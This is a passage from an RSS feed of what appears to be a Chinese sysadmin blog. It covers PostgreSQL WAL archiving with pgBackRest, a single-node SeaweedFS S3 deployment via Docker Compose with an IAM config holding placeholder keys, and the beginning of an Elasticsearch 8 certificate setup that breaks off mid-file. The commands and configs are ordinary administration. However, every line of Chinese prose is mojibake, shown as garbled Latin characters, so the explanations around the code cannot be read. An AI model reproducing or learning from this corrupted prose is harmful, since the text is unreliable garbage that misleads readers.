&lt;p&gt;ä¸Šé¢çš„å¤‡ä»½å…¶å®æœ‰ä¸‰ç§å¤‡ä»½ï¼Œfullå’Œincrå’Œwalå¤‡ä»½ï¼Œé‚£å¦‚æœfullå’Œå¢é‡éƒ½æ²¡äº†ï¼Œåªè¦walè¿˜åœ¨ï¼Œé‚£ä¹ˆä¾ç„¶èƒ½æ¢å¤åˆ°180å¤©ä¹‹å†…çš„æŸä¸ªæ—¶é—´ç‚¹ã€‚walå¾ˆå ç©ºé—´ï¼Œfullä¹Ÿå¾ˆå ç©ºé—´ï¼Œä¸€å®šè¦ç®—å‡†äº†ã€‚&lt;/p&gt;
&lt;p&gt;é‚£å…¶å®pgbackrestæ˜¯ç”¨postgresèº«ä»½å»æ‰§è¡Œå‘½ä»¤çš„ï¼Œæ‰€ä»¥ä¸ç”¨è®¤è¯èº«ä»½ã€‚&lt;/p&gt;
&lt;h5 id=&#34;äºŒé…ç½®postgres&#34;&gt;äºŒã€é…ç½®postgres&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/postgresql/13/main/postgresql.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# walå½’æ¡£æ–¹æ³•ï¼š&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#archive_mode = on&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#archive_command = &amp;#39;cp %p /data/backup/%f&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# pgbackrestå½’æ¡£æ–¹æ³•ï¼š&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;archive_mode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; on                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;archive_command&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;pgbackrest --stanza=main archive-push %p&amp;#39;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;wal_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; replica   &lt;span class=&#34;c1&#34;&gt;#å¤‡ä»½çº§åˆ«æ˜¯å‰¯æœ¬&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;max_wal_senders&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;#æœ€å¤šwalæ—¥å¿—å‘åˆ°3ä¸ªå®¢æˆ·ç«¯å»&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# éœ€è¦é‡å¯postgres&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl restart postgresql
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;ä¸‰æµ‹è¯•pgbackrestçš„å¤‡ä»½åŠŸèƒ½&#34;&gt;ä¸‰ã€æµ‹è¯•pgbackrestçš„å¤‡ä»½åŠŸèƒ½&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;# å»ºç«‹ä¸€ä¸ªstanza&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  sudo -u postgres pgbackrest --stanza&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;main --log-level-console&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;info stanza-create
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;# æ£€æŸ¥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  sudo -u postgres pgbackrest --stanza&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;main --log-level-console&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;info check
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;# æŸ¥çœ‹ä¿¡æ¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  sudo -u postgres pgbackrest info
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20250915200557932&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250915-pgbackrest_restore/image-20250915200557932.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>seaweed S3æœåŠ¡å•æœºç‰ˆæ­£å¼ç¯å¢ƒçš„éƒ¨ç½²</title>
      <link>https://rendoumi.com/posts/20250915-seeweed_single_deploy/</link>
      <pubDate>Mon, 15 Sep 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250915-seeweed_single_deploy/</guid>
      <description>&lt;p&gt;å…¬å¸è¦åšç³»ç»Ÿè¿ç§»ï¼Œä»AWSè¿ç§»åˆ°è‡ªå»ºæœºæˆ¿ï¼Œé‚£è¿ç§»çš„é¡¹ç›®å°±ä¸€å¤§å †ï¼ŒS3ä¹Ÿåœ¨å…¶ä¸­ä¹‹åˆ—ã€‚&lt;/p&gt;
&lt;p&gt;æ‰¾æ¥æ‰¾å»ï¼Œç¬¬ä¸€é¦–é€‰çš„æ›¿ä»£è½¯ä»¶æ˜¯minioï¼Œå¯æ˜¯ä¸‡æ¶çš„minioå›¢é˜Ÿåœ¨è¿™ä¸ªæ—¶é—´ç‚¹ï¼Œå·²ç»åå°ç§»é™¤äº† admin ç›¸å…³çš„æ“ä½œæƒé™&lt;/p&gt;
&lt;p&gt;è¦æƒ³ç”¨å‘¢ï¼Œåªèƒ½ç”¨ä¸ªè€ç‰ˆæœ¬çš„ï¼š&lt;a href=&#34;http://quay.io/minio/minio:RELEASE.2025-04-22T22-12-26Z&#34;&gt;quay.io/minio/minio:RELEASE.2025-04-22T22-12-26Z&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;é‚£åªèƒ½å†æ‰¾äº†ï¼Œäºæ˜¯æ‰¾åˆ°äº†SeaweedFSï¼Œè¿™ä¸ªè½¯ä»¶å…¶å®æ˜¯ä¸ªå½»å¤´å½»å°¾çš„å•æ–‡ä»¶ï¼Œä½†æ˜¯åˆ†å¸ƒå¼å…¨é›†ç¾¤æ¶æ„&lt;/p&gt;
&lt;p&gt;ç®€å•çš„è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªè½¯ä»¶ï¼ŒåŒ…å«äº†10å‡ ç§åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;p&gt;è€Œæˆ‘ä»¬å‘¢ï¼Œå…¶å®å°±è¦å®ƒçš„ä¸€ä¸ªåŠŸèƒ½s3ï¼Œè€Œä¸”è¦ç”¨äºç”Ÿäº§ã€‚ç½‘ä¸Šä¸€å¤§å †çš„æ•™ç¨‹éƒ½æ˜¯å„ç§åˆ†å¸ƒå¼çš„éƒ¨ç½²ï¼Œå¦‚æœæœºå™¨è¶³å¤Ÿï¼Œå¤§å®¶å¯ä»¥å‚è€ƒç½‘ä¸Šæ•™ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å•å°æœºå™¨ï¼Œç¡¬ç›˜åº•å±‚æ˜¯raid10ï¼Œç„¶åä¸Šå±‚å°±åªæä¾›s3ï¼Œè€Œä¸”è¦é…ç½®ç®€å•ï¼Œæ²¡æœ‰ä»€ä¹ˆå®‰å…¨é—®é¢˜ï¼Œè¿™å°æœºå™¨æ˜¯ç›´æ¥æš´éœ²å…¬ç½‘IPçš„ã€‚&lt;/p&gt;
&lt;p&gt;é‚£æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯Docker composeï¼Œè€Œä¸”åªæ”¾å¼€s3çš„æŒ‡å®šç«¯å£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;services:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  seaweedfs-s3:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    image: chrislusf/seaweedfs
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    container_name: seaweedfs-s3
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    volumes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - ./data:/data
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - ./config/config.json:/seaweedfs/config.json
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      - &lt;span class=&#34;s2&#34;&gt;&amp;#34;127.0.0.1:8333:8333&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;c1&#34;&gt;# - &amp;#34;9333:9333&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    entrypoint: /bin/sh -c
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    command: &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;echo &amp;#39;Starting SeaweedFS S3 server&amp;#39; &amp;amp;&amp;amp; \
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;      weed server -dir=/data -volume.max=120 -s3 -s3.config /seaweedfs/config.json&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    restart: unless-stopped
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»”ç»†è§£é‡Šä¸Šé¢çš„å‚æ•°ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ports åªå¼€äº† 127.0.0.1:8333 çš„S3ç«¯å£ï¼Œå…¶å®ƒéƒ½ä¸å¼€ï¼Œå¦‚æœéœ€è¦æŸ¥çœ‹æœåŠ¡çŠ¶æ€ï¼Œå¯ä»¥ä¸´æ—¶æ‰“å¼€9333ç«¯å£æŸ¥çœ‹ï¼Œçœ‹å®Œå†å…³&lt;/li&gt;
&lt;li&gt;-volume.max=120ï¼Œè¿™ä¸ªåŠ¡å¿…è¦æ³¨æ„ï¼Œseaweedæ˜¯åˆ†å·çš„ï¼Œä¸€ä¸ªå·æœ€å¤š30Gï¼Œç¼ºçœæ˜¯8ä¸ªå·ã€‚é‚£ç¼ºçœå°±æ˜¯åªæœ‰240Gçš„å®¹é‡ï¼Œæˆ‘ä»¬çš„ç¡¬ç›˜æ˜¯4Tçš„ï¼Œå‰©ä½™3.7TBï¼Œé‚£ç®—ä¸‹æ¥ï¼Œ30*120=3600G=3.6Tã€‚è¿™æ ·å°±å¯¹å‡†äº†ï¼Œè¿™ä¸ªå‚æ•°ä¸€å®šè¦æ ¹æ®ç”Ÿäº§çš„å®é™…æƒ…å†µè¿›è¡Œè°ƒæ•´.&lt;/li&gt;
&lt;li&gt;å¦å¤–è¿˜æŠŠconfig.jsonçš„é…ç½®æ–‡ä»¶ç»™mountå…¥dockerå·ä¸­äº†ï¼Œé…ç½®æ–‡ä»¶é‡Œæ”¾çš„å°±æ˜¯S3çš„IAMè®¿é—®æƒé™æ§åˆ¶&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;è¯¦ç»†çœ‹ä¸€ä¸‹config.json&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;identities&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;credentials&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;s2&#34;&gt;&amp;#34;accessKey&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;aaa&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;s2&#34;&gt;&amp;#34;secretKey&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;bbb&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;actions&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Admin&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Read&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;List&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Tagging&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Write&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;goods&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;credentials&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;s2&#34;&gt;&amp;#34;accessKey&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;ccc&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;s2&#34;&gt;&amp;#34;secretKey&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;ddd&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;actions&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Read:goods&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Write:goods&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;List:goods&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Tagging:goods&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Admin:goods&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£é‡Šä¸€ä¸‹ï¼Œä¸Šé¢å®šä¹‰äº†ä¸€ä¸ªadminç”¨æˆ·ï¼Œå¯ä»¥å¯¹æ‰€æœ‰s3è¿›è¡Œè¯»å†™å’Œç®¡ç†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç”Ÿäº§ç¯å¢ƒElasticsearch 8å•èŠ‚ç‚¹Docker-composeçš„å®‰è£…æ–¹æ³•</title>
      <link>https://rendoumi.com/posts/20250902-elasticsearch_single_node_8_setup/</link>
      <pubDate>Tue, 02 Sep 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250902-elasticsearch_single_node_8_setup/</guid>
      <description>&lt;p&gt;è¦åœ¨ç”Ÿäº§ç¯å¢ƒå»ºä¸€å¥—Elasticsearch 8.0ï¼Œå•èŠ‚ç‚¹æ­é…Kibanaï¼Œç¡®å®æ˜¯å›°éš¾é‡é‡ï¼Œæ–°ç‰ˆæœ¬éœ€è¦TLSéªŒè¯äº†&lt;/p&gt;
&lt;p&gt;ç°åœ¨è¿™ä¸ªæ—¶é—´èŠ‚ç‚¹ï¼Œ2025å¹´9æœˆ2æ—¥ï¼ŒElasticsearchæœ€æ–°ç‰ˆæœ¬æ˜¯9.0ï¼Œåæ’¤2ä¸ªç‰ˆæœ¬æ˜¯8.18.6&lt;/p&gt;
&lt;p&gt;é‚£å°±ç”¨è¿™ä¸ªç‰ˆæœ¬äº†ï¼Œç„¶åæ ¹æ®å®˜æ–¹çš„æ–‡æ¡£ä¼šæŠŠäººæç³Šæ¶‚çš„ã€‚&lt;/p&gt;
&lt;p&gt;æ­£ç¡®çš„æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h5 id=&#34;ä¸€å»ºç«‹è‡ªç­¾çš„è¯ä¹¦&#34;&gt;ä¸€ã€å»ºç«‹è‡ªç­¾çš„è¯ä¹¦&lt;/h5&gt;
&lt;p&gt;å…¶å®å¯ä»¥ç”¨ACMEçš„è¯ä¹¦ï¼Œä½†æ˜¯æ²¡æœ‰äººä¼šä¸‰ä¸ªæœˆå°±å»é‡å¯ä¸€ä¸‹ESçš„å®¹å™¨ï¼Œæ›´æ–°è¯ä¹¦å§ï¼&lt;/p&gt;
&lt;p&gt;é‚£åªèƒ½é€‰æ‹©è‡ªå»ºCAï¼Œè‡ªç­¾ä¸€ä¸ªè¯ä¹¦äº†ï¼&lt;/p&gt;
&lt;p&gt;å› ä¸ºæœ‰2ä¸ªpodï¼Œeså’Œkibanaï¼Œæ‰€ä»¥è¦ç­¾ä¸¤å¼ è¯ä¹¦ï¼Œç­¾è¯ä¹¦éšä¾¿ç”¨ESçš„ä¸€ä¸ªç‰ˆæœ¬å°±å¯ä»¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.4.1-linux-x86_64.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar -zxf elasticsearch-8.4.1-linux-x86_64.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; elasticsearch-8.4.1/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./bin/elasticsearch-certutil ca --pem
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å¾—åˆ°CAè¯ä¹¦ï¼Œæ”¾åœ¨å½“å‰ç›®å½•caç›®å½•ä¸‹&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;unzip elastic-stack-ca.zip
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ç”Ÿæˆç­¾å‘é…ç½®æ–‡ä»¶&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt;instances.yml 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;instances:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;   - name: es01
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;     dns:
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;       - es01
